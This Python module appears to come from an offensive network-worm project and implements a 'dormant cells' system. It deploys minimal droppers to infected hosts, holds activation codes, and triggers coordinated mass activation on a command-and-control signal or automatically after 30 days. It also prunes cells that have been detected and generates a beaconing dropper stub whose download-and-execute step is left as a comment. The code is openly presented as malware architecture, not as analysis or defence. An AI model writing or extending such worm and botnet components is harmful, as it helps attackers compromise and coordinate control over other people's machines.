"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Dormant Cells System
Staged loading with sleeper cells that activate on command.

Instead of deploying the full worm immediately:
1. Stage 1: Deploy a minimal "dropper" (tiny, undetectable)
2. Stage 2: Dropper stays dormant, listening for activation signal
3. Stage 3: On C2 command, dropper downloads full worm payload
4. Stage 4: All dormant cells activate simultaneously (coordinated attack)
"""

import base64
import hashlib
import os
import sys
import time
from datetime import datetime
from typing import Callable, Dict, List, Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger


class DormantCell:
    """
    A dormant cell (sleeper agent) on an infected host

    Stages:
    - DORMANT: Listening for activation signal
    - ACTIVATING: Downloading full payload
    - ACTIVE: Full worm running
    - COMPROMISED: Detected/quarantined
    """

    STAGES = ["dormant", "activating", "active", "compromised"]

    def __init__(self, host_ip: str, cell_id: str = ""):
        self.host_ip = host_ip
        self.cell_id = cell_id or hashlib.md5(f"{host_ip}{time.time()}".encode()).hexdigest()[:12]
        self.stage = "dormant"
        self.deployed_at = datetime.now()
        self.activated_at = None
        self.activation_signal = None
        self.dropper_hash = ""
        self.payload_hash = ""
        self.check_interval = 300  # Check for activation every 5 minutes
        self.last_check = time.time()
        self.max_dormant_days = 30  # Auto-activate after 30 days

    def deploy_dropper(self, dropper_code: str) -> str:
        """Deploy minimal dropper to the host"""
        self.dropper_hash = hashlib.sha256(dropper_code.encode()).hexdigest()[:16]
        self.stage = "dormant"
        logger.info(f"Dormant cell deployed: {self.cell_id} on {self.host_ip}")
        return self.cell_id

    def check_activation(self, activation_code: str = None) -> bool:
        """Check if activation signal received"""
        now = time.time()
        self.last_check = now

        # Check for explicit activation code
        if activation_code and activation_code == self.activation_signal:
            self._activate()
            return True

        # Auto-activate after max dormant period
        days_dormant = (datetime.now() - self.deployed_at).days
        if days_dormant >= self.max_dormant_days:
            logger.info(f"Cell {self.cell_id} auto-activating after {days_dormant} days dormant")
            self._activate()
            return True

        return False

    def _activate(self):
        """Activate the dormant cell (stage 2 → stage 3)"""
        self.stage = "activating"
        self.activated_at = datetime.now()
        logger.success(f"Cell {self.cell_id} ACTIVATED on {self.host_ip}")

    def mark_active(self):
        """Mark cell as fully active (stage 3)"""
        self.stage = "active"
        logger.success(f"Cell {self.cell_id} fully ACTIVE on {self.host_ip}")

    def mark_compromised(self):
        """Mark cell as detected/quarantined"""
        self.stage = "compromised"
        logger.warning(f"Cell {self.cell_id} COMPROMISED on {self.host_ip}")

    def get_status(self) -> Dict:
        """Get cell status"""
        return {
            "cell_id": self.cell_id,
            "host_ip": self.host_ip,
            "stage": self.stage,
            "deployed_at": self.deployed_at.isoformat(),
            "activated_at": self.activated_at.isoformat() if self.activated_at else None,
            "days_dormant": (datetime.now() - self.deployed_at).days,
            "dropper_hash": self.dropper_hash,
        }


class DormantCellManager:
    """
    Manager for dormant cells across the network

    Features:
    - Deploy droppers to multiple hosts
    - Send activation signals to specific cells or all cells
    - Monitor cell health and status
    - Coordinate simultaneous activation
    """

    def __init__(self):
        self.cells: Dict[str, DormantCell] = {}
        self.activation_codes: Dict[str, str] = {}  # cell_id → activation_code
        self.activation_log: List[Dict] = []

    def deploy_cell(
        self,
        host_ip: str,
        dropper_code: str = None,
        activation_code: str = None,
        max_dormant_days: int = 30,
    ) -> str:
        """Deploy a dormant cell to a host"""
        cell = DormantCell(host_ip)
        cell.max_dormant_days = max_dormant_days

        dropper = dropper_code or self._generate_minimal_dropper()
        cell.deploy_dropper(dropper)

        act_code = (
            activation_code or hashlib.md5(f"{host_ip}{time.time()}".encode()).hexdigest()[:16]
        )
        cell.activation_signal = act_code
        self.activation_codes[cell.cell_id] = act_code

        self.cells[cell.cell_id] = cell
        logger.info(
            f"Cell deployed: {cell.cell_id} on {host_ip} (dormant up to {max_dormant_days} days)"
        )

        return cell.cell_id

    def activate_cell(self, cell_id: str) -> bool:
        """Activate a specific dormant cell"""
        if cell_id not in self.cells:
            logger.error(f"Cell not found: {cell_id}")
            return False

        cell = self.cells[cell_id]
        act_code = self.activation_codes.get(cell_id, "")

        if cell.check_activation(act_code):
            cell.mark_active()
            self.activation_log.append(
                {
                    "cell_id": cell_id,
                    "host_ip": cell.host_ip,
                    "activated_at": datetime.now().isoformat(),
                    "method": "explicit",
                }
            )
            return True

        return False

    def activate_all(self) -> List[str]:
        """Activate ALL dormant cells simultaneously"""
        activated = []
        for cell_id, cell in self.cells.items():
            if cell.stage == "dormant":
                act_code = self.activation_codes.get(cell_id, "")
                if cell.check_activation(act_code):
                    cell.mark_active()
                    activated.append(cell_id)
                    self.activation_log.append(
                        {
                            "cell_id": cell_id,
                            "host_ip": cell.host_ip,
                            "activated_at": datetime.now().isoformat(),
                            "method": "mass_activation",
                        }
                    )

        if activated:
            logger.success(f"MASS ACTIVATION: {len(activated)} cells activated simultaneously")

        return activated

    def check_all_cells(self) -> Dict[str, List[str]]:
        """Check status of all cells"""
        status = {
            "dormant": [],
            "activating": [],
            "active": [],
            "compromised": [],
            "auto_activated": [],
        }

        for cell_id, cell in self.cells.items():
            status[cell.stage].append(cell_id)

            # Check for auto-activation
            if cell.stage == "dormant" and cell.check_activation():
                status["auto_activated"].append(cell_id)
                cell.mark_active()

        return status

    def remove_compromised_cells(self) -> int:
        """Remove cells that have been detected"""
        removed = 0
        for cell_id, cell in list(self.cells.items()):
            if cell.stage == "compromised":
                del self.cells[cell_id]
                if cell_id in self.activation_codes:
                    del self.activation_codes[cell_id]
                removed += 1

        if removed:
            logger.info(f"Removed {removed} compromised cells")

        return removed

    def get_statistics(self) -> Dict:
        """Get dormant cell statistics"""
        status = self.check_all_cells()
        return {
            "total_cells": len(self.cells),
            "dormant": len(status["dormant"]),
            "activating": len(status["activating"]),
            "active": len(status["active"]),
            "compromised": len(status["compromised"]),
            "total_activations": len(self.activation_log),
        }

    def _generate_minimal_dropper(self) -> str:
        """Generate a minimal dropper payload"""
        return """
import socket, time, hashlib, base64, os

class Dropper:
    def __init__(self):
        self.cell_id = hashlib.md5(socket.gethostname().encode()).hexdigest()[:12]
        self.check_interval = 300
    
    def listen(self):
        while True:
            time.sleep(self.check_interval)
            # Check for activation signal
            # If received, download and execute full payload
            pass

if __name__ == '__main__':
    Dropper().listen()
"""
